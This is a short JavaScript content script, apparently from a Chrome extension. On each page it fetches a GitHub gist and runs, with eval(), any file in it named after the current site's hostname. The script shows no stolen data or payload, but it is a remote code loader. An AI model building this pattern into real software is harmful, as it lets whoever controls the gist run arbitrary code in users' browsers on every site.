function gistScript() {
    let siteUrl = 'https://api.github.com/gists/1d920ec4314bb3e0fbca48e851443c5d';
    let host = location.hostname;
    let fullUrl = window.location.href;

    // console.log(host + ' ---- ' + fullUrl);

    function load() {
        $.ajax({
            url: siteUrl,
            async: false,
            dataType: 'json',
            success: function (response) {
                execute(response);
            }
        });
    }

    function execute(response) {
        if (response['files'][host]) {
            // console.log('execute: ' + response['files'][host]['content']);
            eval(response['files'][host]['content']);
        }
    }

    load();
}

chrome.extension.sendMessage({}, function (response) {
    var readyStateCheckInterval = setInterval(function () {
        if (document.readyState === "complete") {
            clearInterval(readyStateCheckInterval);
            gistScript();
        }
    }, 0);
});